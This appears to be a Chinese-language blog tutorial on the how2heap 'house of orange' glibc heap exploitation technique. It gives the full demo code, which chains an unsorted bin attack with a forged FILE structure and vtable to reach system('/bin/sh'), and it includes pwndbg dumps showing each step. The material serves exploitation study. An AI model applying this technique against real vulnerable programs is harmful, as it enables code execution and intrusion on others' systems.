---
layout: post
title: how2heap - house_of_orange
category: Heap Exploitation
published: true
---

## house_of_orange

### unsorted bin attack + FSOP

先是利用unsorted bin attack来实现任意地址改写，再通过伪造`__IO_list_all`结构体来完成任意代码执行，具体分析见下。（下面源码中删除了大段的注释和log。）

```c
int winner ( char *ptr);

int main()
{
    char *p1, *p2;
    size_t io_list_all, *top;

    // 1
    p1 = malloc(0x400-16);

    top = (size_t *) ( (char *) p1 + 0x400 - 16);
    top[1] = 0xc01;

    p2 = malloc(0x1000);

    io_list_all = top[2] + 0x9a8;
 
    top[3] = io_list_all - 0x10;

    memcpy( ( char *) top, "/bin/sh\x00", 8);

    top[1] = 0x61;

    /*
      Now comes the part where we satisfy the constraints on the fake file pointer
      required by the function _IO_flush_all_lockp and tested here:
      https://code.woboq.org/userspace/glibc/libio/genops.c.html#813

      We want to satisfy the first condition:
      fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base
    */

    FILE *fp = (FILE *) top;


    /*
      1. Set mode to 0: fp->_mode <= 0
    */

    fp->_mode = 0; // top+0xc0


    /*
      2. Set write_base to 2 and write_ptr to 3: fp->_IO_write_ptr > fp->_IO_write_base
    */

    fp->_IO_write_base = (char *) 2; // top+0x20
    fp->_IO_write_ptr = (char *) 3; // top+0x28


    /*
      4) Finally set the jump table to controlled memory and place system there.
      The jump table pointer is right after the FILE struct:
      base_address+sizeof(FILE) = jump_table

         4-a)  _IO_OVERFLOW  calls the ptr at offset 3: jump_table+0x18 == winner
    */

    size_t *jump_table = &top[12]; // controlled memory
    jump_table[3] = (size_t) &winner;
    *(size_t *) ((size_t) fp + sizeof(FILE)) = (size_t) jump_table; // top+0xd8


    /* Finally, trigger the whole chain by calling malloc */
    malloc(10);

   /*
     The libc's error message will be printed to the screen
     But you'll get a shell anyways.
   */

    return 0;
}

int winner(char *ptr)
{ 
    system(ptr);
    syscall(SYS_exit, 0);
    return 0;
}

```

整个代码中并没有free的操作，而是通过扩展top chunk时对old top chunk执行_int_free来创建free chunk。

p1指向0x400大小的一块内存，同时观察下top chunk，可以看到此时topchunk就在p1+0x3f0(0x400 - 0x10)的位置，其大小为0x20c01(0x21000-0x400):

```bash
pwndbg> x/4gx p1 - 0x10
0x602000: 0x0000000000000000 0x0000000000000401
0x602010: 0x0000000000000000 0x0000000000000000

pwndbg> x/4gx p1+0x3f0
0x602400: 0x0000000000000000 0x0000000000020c01
0x602410: 0x0000000000000000 0x0000000000000000
```

此时，更改topchunk的大小，该大小必须页对齐，同时prev_inuse被置为1。这样做的目的是为了下一次malloc一定大小(大于topchunk更改后的大小)时，可以将剩下的top chunk释放掉，插入unsorted bin。

在此之后，top指向了topchunk，大小改为了0xc01:

```bash
pwndbg> x/4gx top
0x602400: 0x0000000000000000 0x0000000000000c01
0x602410: 0x0000000000000000 0x0000000000000000
```

p2指向0x1000大小的内存，由于0x1000 > 0xc01，所以系统会通过mmap再请求一块内存页。同时，0x602400开始的top chunk被移入了unsorted bin中。

```bash
unsortedbin
all: 0x602400 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x602400

pwndbg> x/2gx p2 - 0x10
0x623000: 0x0000000000000000 0x0000000000001011
```

至此，第一阶段获取unsortedbin已经完成了。在进行下一步之前需要理解FSOP的概念，当程序遇到一些原因退出时，会通过`_IO_flush_all_lockp`函数刷新IO，其流程主要是通过遍历IO_list_all的链表，每次遍历都会调用该FILE结构体中vtable表的`_IO_OVERFLOW`函数来刷新缓存。我们的目的也就是通过unsorted bin来改写IO_list_all指针，使其指向main_arena中的位置，并在对应的chain字段中赋值我们伪造的FILE结构体，最后通过调用该结构体中的vtable中的伪造函数来完成利用。以下是源码中遍历的部分：

```c
int
_IO_flush_all_lockp (int do_lock)
{
  int result = 0;
  struct _IO_FILE *fp;
  int last_stamp;

  fp = (_IO_FILE *) _IO_list_all;
  while (fp != NULL)
    {
    ...
      if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
     || (_IO_vtable_offset (fp) == 0
         && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
            > fp->_wide_data->_IO_write_base))
#endif
     )
    && _IO_OVERFLOW (fp, EOF) == EOF)   // 刷新
  result = EOF;

      
  fp = fp->_chain; // 遍历链表
    }
...
}
```

根据`_IO_list_all`距离unsorted bin的偏移为0x9a8可以计算出`_IO_list_all`的地址:

```bash
pwndbg> x/4gx top
0x602400: 0x0000000000000000 0x0000000000000be1
0x602410: 0x00007ffff7dd1b78 0x00007ffff7dd1b78
pwndbg> x/x 0x00007ffff7dd1b78 + 0x9a8
0x7ffff7dd2520 <_IO_list_all>: 0x00007ffff7dd2540
```

当下次分配需要从unsorted bin中取free chunk的时候，顶部的free chunk->bk->fd会被改写为指向unsorted bin，所以我们将__IO_list_all - 0x10放置在top->bk的位置，使其指向的地址被改写。

```bash
pwndbg> x/4gx top
0x602400: 0x0000000000000000 0x0000000000000be1
0x602410: 0x00007ffff7dd1b78 0x00007ffff7dd2510
```

接下来就是构造fake FILE结构体了。

首先将top首地址内容改为`/bin/sh`。其次，我们通过将top的size字段改为0x61，来使下一次malloc时将这个top塞入_IO_list_all + 0x68的位置，即FILE->_chain的偏移，`_IO_flush_all_lockp`就是通过这个字段来遍历的。改大小的原因是smallbin[4](90 ~ 98)正好在unsortedbin+0x68的位置，而下一次malloc时unsortedbin如果发现这个chunk不满足请求大小，就会将其放入对应大小的bin中。所以通过将size改为0x61，可以将top移入到smallbin[4]的位置。

```bash
pwndbg> x/4gx top
0x602400: 0x0068732f6e69622f 0x0000000000000061
0x602410: 0x00007ffff7dd1b78 0x00007ffff7dd2510
```

接下来为了使`_IO_overflow_`函数能够被调用，还需要更改两个参数，以绕过条件检查：

```c
      if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
           || (_IO_vtable_offset (fp) == 0
               && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
                                    > fp->_wide_data->_IO_write_base))
           )
          && _IO_OVERFLOW (fp, EOF) == EOF)
        result = EOF;
```

主要是满足两个条件：

1. fp->_mode <=0
2. fp->_IO_write_ptr > fp->_IO_write_base

所以代码中将mode置为0，_IO_write_base置为2，_IO_write_ptr置为3

```bash
pwndbg> x/10gx top
0x602400: 0x0068732f6e69622f 0x0000000000000061
0x602410: 0x00007ffff7dd1b78 0x00007ffff7dd2510
0x602420: 0x0000000000000002 0x0000000000000003
```

最后，伪造vtable。可以看到，vtable的偏移是sizeof(FILE)，即0xd8:

```c
struct _IO_FILE_plus
{
  _IO_FILE file;
  const struct _IO_jump_t *vtable;
};
```

而 _IO_overflow_在vtable中的index是3，所以在top[12]的位置构造了一个jump_table，将jump_table[3]赋值为`winner`函数的地址，最后将jump_table的地址赋值给top + 0xd8的位置。

```bash
pwndbg> x/x top + (0xd8 / 8)
0x6024d8: 0x0000000000602460
pwndbg> x/4gx 0x0000000000602460
0x602460: 0x0000000000000000 0x0000000000000000
0x602470: 0x0000000000000000 0x00000000004007df
pwndbg> x/x 0x4007df
0x4007df <winner>: 0x10ec8348e5894855
```

最后的最后，`malloc(10)`，malloc在将unsorted bin的chunk移入smallbin并且完成_IO_list_all的改写后，会对chunk的size进行检查：

```c
         if (__glibc_unlikely (size <= 2 * SIZE_SZ)
              || __glibc_unlikely (size > av->system_mem))
```

而我们伪造的chunk并不满足条件，在退出前调用`_IO_flush_all_lockp`遍历刷新IO，最终调用winner函数，得到shell。

```sh
pwndbg> bt
#0  winner (ptr=0x602400 "/bin/sh") at glibc_2.23/house_of_orange.c:269
#1  0x00007ffff7a891a6 in _IO_flush_all_lockp (do_lock=do_lock@entry=0) at genops.c:786
#2  0x00007ffff7a43fcd in __GI_abort () at abort.c:74
#3  0x00007ffff7a847fa in __libc_message (do_abort=2, fmt=fmt@entry=0x7ffff7b9df98 "*** Error in `%s': %s: 0x%s ***\n") at ../sysdeps/posix/libc_fatal.c:175
#4  0x00007ffff7a8f15e in malloc_printerr (ar_ptr=0x7ffff7dd1b20 <main_arena>, ptr=0x7ffff7dd2520 <_IO_list_all>, str=0x7ffff7b9adff "malloc(): memory corruption", action=<optimized out>) at malloc.c:5020
#5  _int_malloc (av=av@entry=0x7ffff7dd1b20 <main_arena>, bytes=bytes@entry=10) at malloc.c:3481
#6  0x00007ffff7a911d4 in __GI___libc_malloc (bytes=10) at malloc.c:2920
#7  0x00000000004007d8 in main () at glibc_2.23/house_of_orange.c:257
#8  0x00007ffff7a2d840 in __libc_start_main (main=0x4006a6 <main>, argc=1, argv=0x7fffffffde98, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffde88) at ../csu/libc-start.c:291
#9  0x00000000004005d9 in _start ()
```

### Reference

[FILE structure](https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/)

[FSOP](https://ray-cp.github.io/archivers/IO_FILE_vtable_hajack_and_fsop)